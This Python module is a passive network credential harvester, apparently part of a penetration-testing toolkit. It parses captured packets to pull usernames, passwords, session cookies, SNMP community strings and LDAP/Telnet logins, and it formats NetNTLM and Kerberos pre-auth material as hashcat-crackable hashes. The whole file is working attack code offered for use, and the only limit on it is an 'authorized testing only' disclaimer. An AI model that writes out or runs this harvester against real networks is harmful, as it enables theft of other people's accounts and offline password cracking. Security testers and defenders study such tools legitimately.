"""Credential & secret harvester.

Passively extracts credentials and secrets from cleartext protocols in observed
traffic: HTTP Basic/Digest auth, HTTP login forms, cookies, FTP, SMTP/POP3/IMAP
(USER/PASS + AUTH LOGIN base64), SNMP community strings, LDAP simple binds,
Telnet logins, NTLM (NetNTLMv1/v2 hashes over HTTP), and Kerberos AS-REQ pre-auth
(crackable timestamps).

Stateful per flow, so USER/PASS or AUTH LOGIN spread across packets get paired.
`extract(pkt)` is a pure-ish per-packet call (state lives on the instance), so
it is easy to unit-test with crafted packets and drive from the live tap.

For authorized security testing only.
"""

from __future__ import annotations

import base64
import re
from dataclasses import dataclass
from urllib.parse import parse_qs, unquote_plus

_FORM_USER = ("user", "username", "login", "email", "userid", "user_name", "usr")
_FORM_PASS = ("pass", "password", "passwd", "pwd", "pass1", "user_pass")


# --- small BER/DER helpers (LDAP + Kerberos are ASN.1) ----------------------
def _ber_len(data: bytes, i: int) -> tuple[int, int]:
    """Return (length, index-just-past-the-length-bytes) for the TLV length at i."""
    b = data[i]
    if b < 0x80:
        return b, i + 1
    n = b & 0x7F
    return int.from_bytes(data[i + 1:i + 1 + n], "big"), i + 1 + n


def _der_tlv(data: bytes, i: int) -> tuple[int, bytes, int]:
    """Return (tag, content, next_index) for the TLV starting at i."""
    tag = data[i]
    length, j = _ber_len(data, i + 1)
    return tag, data[j:j + length], j + length


def _u16(b: bytes, o: int) -> int:
    return int.from_bytes(b[o:o + 2], "little")


def _u32(b: bytes, o: int) -> int:
    return int.from_bytes(b[o:o + 4], "little")


def _b64_bytes(s: str) -> bytes:
    try:
        return base64.b64decode(s)
    except Exception:
        return b""


def _strip_telnet_iac(data: bytes) -> bytes:
    """Remove Telnet IAC command/negotiation/subnegotiation sequences."""
    out = bytearray()
    i, n = 0, len(data)
    while i < n:
        b = data[i]
        if b == 0xFF:                              # IAC
            if i + 1 < n and data[i + 1] in (0xFB, 0xFC, 0xFD, 0xFE):  # WILL/WONT/DO/DONT
                i += 3
            elif i + 1 < n and data[i + 1] == 0xFA:                    # SB ... SE
                end = data.find(b"\xff\xf0", i)
                i = (end + 2) if end != -1 else n
            else:
                i += 2
        else:
            out.append(b)
            i += 1
    return bytes(out)


@dataclass
class Credential:
    kind: str            # http-basic/http-digest/http-form/cookie/ftp/smtp/pop3/imap/
                         # snmp/ldap/telnet/ntlm/kerberos
    proto: str
    src: str = ""
    dst: str = ""
    username: str = ""
    secret: str = ""
    detail: str = ""

    def as_dict(self) -> dict:
        return {k: getattr(self, k) for k in self.__dataclass_fields__}


def _endpoints(pkt) -> tuple[str, str]:
    for ln, a, b in (("IP", "src", "dst"), ("IPv6", "src", "dst")):
        if pkt.haslayer(ln):
            layer = pkt.getlayer(ln)
            return str(layer.getfieldval(a)), str(layer.getfieldval(b))
    return "", ""


def _ports(pkt) -> tuple[int, int]:
    for ln in ("TCP", "UDP"):
        if pkt.haslayer(ln):
            layer = pkt.getlayer(ln)
            return int(layer.sport), int(layer.dport)
    return 0, 0


class CredentialExtractor:
    def __init__(self):
        from reforge.core.scapy_init import warmup
        warmup()
        # per-flow scratch: (src,sport,dst,dport) -> {"user":..., "auth_stage":...}
        self._flows: dict[tuple, dict] = {}
        # per-CONNECTION scratch, shared across both directions — NTLM pairs a
        # server challenge with a client response, Telnet pairs a server prompt
        # with a client keystroke, so they need bidirectional state.
        self._conns: dict[tuple, dict] = {}

    def _flow(self, pkt) -> dict:
        src, dst = _endpoints(pkt)
        sport, dport = _ports(pkt)
        return self._flows.setdefault((src, sport, dst, dport), {})

    def _conn(self, pkt) -> dict:
        src, dst = _endpoints(pkt)
        sport, dport = _ports(pkt)
        key = tuple(sorted([(src, sport), (dst, dport)]))
        return self._conns.setdefault(key, {})

    def extract(self, pkt) -> list[Credential]:
        from scapy.packet import Raw

        out: list[Credential] = []
        src, dst = _endpoints(pkt)

        # SNMP community (needs no Raw text)
        out += self._snmp(pkt, src, dst)

        # Kerberos AS-REQ pre-auth can ride UDP with no Raw layer in some stacks;
        # try it on any payload we can reach below. First the Raw-gated protocols.
        if not pkt.haslayer(Raw):
            return out
        try:
            payload = bytes(pkt[Raw].load)
        except Exception:
            return out
        sport, dport = _ports(pkt)
        text = payload.decode("latin-1", errors="replace")
        conn = self._conn(pkt)

        out += self._http(text, src, dst)
        out += self._line_protocols(text, self._flow(pkt), src, dst, dport)
        out += self._ntlm(text, conn, src, dst)                       # NTLM over HTTP
        out += self._ldap(payload, src, dst, sport, dport)            # LDAP simple bind
        out += self._telnet(payload, conn, src, dst, sport, dport)    # Telnet login
        out += self._kerberos(payload, src, dst, sport, dport)        # Kerberos AS-REQ
        return out

    def extract_text(self, text: str, src: str, dst: str, dport: int,
                     flow_key: tuple) -> list[Credential]:
        """Extract from reassembled application bytes (not a single packet)."""
        flow = self._flows.setdefault(flow_key, {})
        return self._http(text, src, dst) + self._line_protocols(text, flow, src, dst, dport)

    # ---- HTTP ---------------------------------------------------------------
    def _http(self, text: str, src: str, dst: str) -> list[Credential]:
        out: list[Credential] = []
        if not re.match(r"^(GET|POST|PUT|HEAD|DELETE|OPTIONS|PATCH) ", text) \
           and not text.startswith("HTTP/"):
            return out

        # Basic auth
        m = re.search(r"[Aa]uthorization:\s*Basic\s+([A-Za-z0-9+/=]+)", text)
        if m:
            try:
                dec = base64.b64decode(m.group(1)).decode("latin-1")
                if ":" in dec:
                    u, p = dec.split(":", 1)
                    out.append(Credential("http-basic", "HTTP", src, dst, u, p,
                                          "Authorization: Basic"))
            except Exception:
                pass

        # Digest auth — capture username + response hash (crackable offline)
        dm = re.search(r"[Aa]uthorization:\s*Digest\s+([^\r\n]+)", text)
        if dm:
            params = dict(re.findall(r'(\w+)="?([^",\r\n]+)"?', dm.group(1)))
            if params.get("username") and params.get("response"):
                out.append(Credential("http-digest", "HTTP", src, dst,
                                      params["username"], params["response"],
                                      f"Digest realm={params.get('realm', '')}"))

        # Cookies (session tokens)
        for cm in re.finditer(r"[Cc]ookie:\s*([^\r\n]+)", text):
            out.append(Credential("cookie", "HTTP", src, dst, secret=cm.group(1).strip(),
                                  detail="Cookie header"))

        # Form POST body
        if text.startswith("POST"):
            body = text.split("\r\n\r\n", 1)[1] if "\r\n\r\n" in text else ""
            if body and "=" in body:
                fields = {k.lower(): v for k, v in
                          ((k, v[0]) for k, v in parse_qs(body).items())}
                user = next((fields[k] for k in _FORM_USER if k in fields), "")
                pwd = next((fields[k] for k in _FORM_PASS if k in fields), "")
                if user or pwd:
                    out.append(Credential("http-form", "HTTP", src, dst,
                                          unquote_plus(user), unquote_plus(pwd),
                                          "form POST"))
        return out

    # ---- line-oriented (FTP/SMTP/POP3/IMAP) ---------------------------------
    def _line_protocols(self, text: str, flow: dict, src: str, dst: str, dport: int) -> list[Credential]:
        out: list[Credential] = []
        proto = {21: "FTP", 25: "SMTP", 587: "SMTP", 110: "POP3", 143: "IMAP"}.get(dport)

        for raw_line in text.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            up = line.upper()

            # IMAP tagged commands (the code below keys on POP3/FTP syntax, which
            # IMAP does not use): "<tag> LOGIN user pass" or "<tag> AUTHENTICATE LOGIN".
            if proto == "IMAP":
                toks = line.split()
                if len(toks) >= 4 and toks[1].upper() == "LOGIN":
                    out.append(Credential("imap", "IMAP", src, dst,
                                          toks[2].strip('"'), toks[3].strip('"'), "LOGIN"))
                    continue
                if len(toks) >= 3 and toks[1].upper() == "AUTHENTICATE" \
                        and toks[2].upper() == "LOGIN":
                    flow["auth"] = "user"        # base64 user/pass follow (handled below)
                    continue

            # FTP / POP3 USER + PASS
            if up.startswith("USER "):
                flow["user"] = line[5:].strip()
            elif up.startswith("PASS ") and "user" in flow:
                out.append(Credential((proto or "ftp").lower(), proto or "FTP", src, dst,
                                      flow.pop("user"), line[5:].strip(), "USER/PASS"))

            # SMTP/IMAP AUTH LOGIN (base64 user then pass over subsequent lines)
            elif up.startswith("AUTH LOGIN"):
                flow["auth"] = "user"
            elif flow.get("auth") == "user" and _is_b64(line):
                flow["auth_user"] = _b64(line)
                flow["auth"] = "pass"
            elif flow.get("auth") == "pass" and _is_b64(line):
                out.append(Credential((proto or "smtp").lower(), proto or "SMTP", src, dst,
                                      flow.pop("auth_user", ""), _b64(line), "AUTH LOGIN"))
                flow.pop("auth", None)
            # AUTH PLAIN (base64 of \0user\0pass)
            elif up.startswith("AUTH PLAIN") and len(line.split()) >= 3 and _is_b64(line.split()[2]):
                try:
                    parts = _b64(line.split()[2]).split("\x00")
                    if len(parts) >= 3:
                        out.append(Credential((proto or "smtp").lower(), proto or "SMTP",
                                              src, dst, parts[1], parts[2], "AUTH PLAIN"))
                except Exception:
                    pass
        return out

    # ---- SNMP ---------------------------------------------------------------
    def _snmp(self, pkt, src: str, dst: str) -> list[Credential]:
        try:
            from scapy.layers.snmp import SNMP

            if pkt.haslayer(SNMP):
                community = pkt[SNMP].community.val
                if isinstance(community, bytes):
                    community = community.decode("latin-1", "replace")
                return [Credential("snmp", "SNMP", src, dst, secret=str(community),
                                   detail="community string")]
        except Exception:
            pass
        return []

    # ---- NTLM over HTTP (NetNTLMv1/v2 hashes) -------------------------------
    def _ntlm(self, text: str, conn: dict, src: str, dst: str) -> list[Credential]:
        out: list[Credential] = []
        m2 = re.search(r"WWW-Authenticate:\s*(?:NTLM|Negotiate)\s+([A-Za-z0-9+/=]+)", text, re.I)
        if m2:
            blob = _b64_bytes(m2.group(1))
            if blob[:8] == b"NTLMSSP\x00" and _u32(blob, 8) == 2 and len(blob) >= 32:
                conn["ntlm_chal"] = blob[24:32]            # 8-byte server challenge
        m3 = re.search(r"Authorization:\s*(?:NTLM|Negotiate)\s+([A-Za-z0-9+/=]+)", text, re.I)
        if m3:
            blob = _b64_bytes(m3.group(1))
            if blob[:8] == b"NTLMSSP\x00" and _u32(blob, 8) == 3:
                c = _ntlm_type3(blob, conn.get("ntlm_chal"), src, dst)
                if c:
                    out.append(c)
        return out

    # ---- LDAP simple bind ---------------------------------------------------
    def _ldap(self, payload: bytes, src: str, dst: str, sport: int, dport: int) -> list[Credential]:
        if not ({sport, dport} & {389, 3268}):     # LDAP / Global Catalog (cleartext)
            return []
        try:
            tag, msg, _ = _der_tlv(payload, 0)      # LDAPMessage SEQUENCE
            if tag != 0x30:
                return []
            t, _, i = _der_tlv(msg, 0)              # messageID INTEGER
            if t != 0x02:
                return []
            t, bind, _ = _der_tlv(msg, i)           # BindRequest [APPLICATION 0]
            if t != 0x60:
                return []
            t, _, i2 = _der_tlv(bind, 0)            # version INTEGER
            if t != 0x02:
                return []
            t, dn, i3 = _der_tlv(bind, i2)          # name LDAPDN OCTET STRING
            if t != 0x04:
                return []
            t, pw, _ = _der_tlv(bind, i3)           # authentication simple [0]
            if t != 0x80:                           # 0xA3 would be SASL — not cleartext
                return []
            dn_s = dn.decode("utf-8", "replace")
            pw_s = pw.decode("utf-8", "replace")
            if pw_s:                                # skip anonymous (empty-password) binds
                return [Credential("ldap", "LDAP", src, dst, dn_s, pw_s, "simple bind")]
        except Exception:
            pass
        return []

    # ---- Telnet (char-at-a-time login) --------------------------------------
    def _telnet(self, payload: bytes, conn: dict, src: str, dst: str,
                sport: int, dport: int) -> list[Credential]:
        if 23 not in (sport, dport):
            return []
        data = _strip_telnet_iac(payload)
        out: list[Credential] = []
        if sport == 23:                             # server -> client: prompts
            low = data.lower()
            if b"password" in low:
                conn["tn_expect"] = "pass"
            elif b"login" in low or b"username" in low:
                conn["tn_expect"] = "user"
            return out
        # client -> server (dport 23): typed characters, terminated by CR/LF
        for ch in data:
            c = chr(ch)
            if c in "\r\n":
                line = conn.pop("tn_line", "")
                if not line:
                    continue
                if conn.get("tn_expect") == "user":
                    conn["tn_user"] = line
                elif conn.get("tn_expect") == "pass" and "tn_user" in conn:
                    out.append(Credential("telnet", "Telnet", src, dst,
                                          conn.pop("tn_user"), line, "login"))
                    conn.pop("tn_expect", None)
            elif c.isprintable():
                conn["tn_line"] = conn.get("tn_line", "") + c
        return out

    # ---- Kerberos AS-REQ pre-auth (crackable timestamp) ---------------------
    def _kerberos(self, payload: bytes, src: str, dst: str,
                  sport: int, dport: int) -> list[Credential]:
        if 88 not in (sport, dport):
            return []
        # UDP/88 carries the AS-REQ raw; TCP/88 prefixes a 4-byte length
        for data in (payload, payload[4:] if len(payload) > 4 else b""):
            c = _parse_as_req(data, src, dst)
            if c:
                return [c]
        return []


def _ntlm_type3(blob: bytes, challenge: bytes | None, src: str, dst: str) -> Credential | None:
    """Parse an NTLMSSP Type 3 message into a hashcat NetNTLM hash."""
    try:
        def sb(off: int) -> bytes:                  # security buffer at offset
            ln = _u16(blob, off)
            o = _u32(blob, off + 4)
            return blob[o:o + ln]

        lm, nt = sb(12), sb(20)
        domain = sb(28).decode("utf-16-le", "replace")
        user = sb(36).decode("utf-16-le", "replace")
        if not user:
            return None
        chal = challenge.hex() if challenge else "0" * 16
        if len(nt) > 24:                            # NetNTLMv2
            secret = f"{user}::{domain}:{chal}:{nt[:16].hex()}:{nt[16:].hex()}"
            detail = "NetNTLMv2 (hashcat -m 5600)"
        elif len(nt) == 24:                         # NetNTLMv1
            secret = f"{user}::{domain}:{lm.hex()}:{nt.hex()}:{chal}"
            detail = "NetNTLMv1 (hashcat -m 5500)"
        else:
            return None
        return Credential("ntlm", "NTLM", src, dst, f"{domain}\\{user}", secret, detail)
    except Exception:
        return None


def _parse_as_req(data: bytes, src: str, dst: str) -> Credential | None:
    """Extract a crackable PA-ENC-TIMESTAMP from a Kerberos AS-REQ, if present."""
    try:
        tag, body, _ = _der_tlv(data, 0)            # AS-REQ [APPLICATION 10] = 0x6A
        if tag != 0x6A:
            return None
        tag, seq, _ = _der_tlv(body, 0)             # inner SEQUENCE
        if tag != 0x30:
            return None
        fields: dict[int, bytes] = {}
        i = 0
        while i < len(seq):                         # context-tagged: [3]padata [4]req-body
            t, content, i = _der_tlv(seq, i)
            fields[t & 0x1F] = content
        if 3 not in fields or 4 not in fields:
            return None
        cipher, etype = _find_pa_enc_ts(fields[3])
        if cipher is None:
            return None
        user, realm = _asreq_identity(fields[4])
        secret = f"$krb5pa${etype}${user}${realm}${cipher.hex()}"
        return Credential("kerberos", "Kerberos", src, dst, f"{user}@{realm}", secret,
                          "AS-REQ pre-auth (hashcat -m 7500)")
    except Exception:
        return None


def _find_pa_enc_ts(pa3: bytes):
    """From padata [3] (a SEQUENCE OF PA-DATA), return (cipher, etype) of the
    PA-ENC-TIMESTAMP (padata-type 2), or (None, None)."""
    _, seqof, _ = _der_tlv(pa3, 0)                  # SEQUENCE OF
    i = 0
    while i < len(seqof):
        _, pd, i = _der_tlv(seqof, i)               # PA-DATA SEQUENCE
        ptype, pval, j = None, None, 0
        while j < len(pd):
            t, c, j = _der_tlv(pd, j)
            if (t & 0x1F) == 1:                     # padata-type [1] INTEGER
                _, iv, _ = _der_tlv(c, 0)
                ptype = int.from_bytes(iv, "big")
            elif (t & 0x1F) == 2:                   # padata-value [2] OCTET STRING
                pval = c
        if ptype == 2 and pval:
            _, enc, _ = _der_tlv(pval, 0)           # OCTET STRING -> EncryptedData DER
            _, eseq, _ = _der_tlv(enc, 0)           # EncryptedData SEQUENCE
            etype, cipher, k = None, None, 0
            while k < len(eseq):
                t, c, k = _der_tlv(eseq, k)
                if (t & 0x1F) == 0:                 # etype [0] INTEGER
                    _, xv, _ = _der_tlv(c, 0)
                    etype = int.from_bytes(xv, "big")
                elif (t & 0x1F) == 2:               # cipher [2] OCTET STRING
                    _, xv, _ = _der_tlv(c, 0)
                    cipher = xv
            return cipher, etype
    return None, None


def _asreq_identity(rb4: bytes) -> tuple[str, str]:
    """From req-body [4], return (cname joined, realm)."""
    _, seq, _ = _der_tlv(rb4, 0)                    # KDC-REQ-BODY SEQUENCE
    user, realm = "", ""
    i = 0
    while i < len(seq):
        t, c, i = _der_tlv(seq, i)
        n = t & 0x1F
        if n == 1:                                  # cname [1] PrincipalName
            user = _principal_name(c)
        elif n == 2:                                # realm [2] Realm (a string)
            _, rv, _ = _der_tlv(c, 0)
            realm = rv.decode("utf-8", "replace")
    return user, realm


def _principal_name(pn: bytes) -> str:
    _, seq, _ = _der_tlv(pn, 0)                     # PrincipalName SEQUENCE
    i = 0
    while i < len(seq):
        t, c, i = _der_tlv(seq, i)
        if (t & 0x1F) == 1:                         # name-string [1] SEQUENCE OF string
            _, sof, _ = _der_tlv(c, 0)
            parts, j = [], 0
            while j < len(sof):
                _, gv, j = _der_tlv(sof, j)
                parts.append(gv.decode("utf-8", "replace"))
            return "/".join(parts)
    return ""


def _is_b64(s: str) -> bool:
    return bool(re.fullmatch(r"[A-Za-z0-9+/]{4,}={0,2}", s)) and len(s) % 4 == 0


def _b64(s: str) -> str:
    try:
        return base64.b64decode(s).decode("latin-1", "replace")
    except Exception:
        return ""
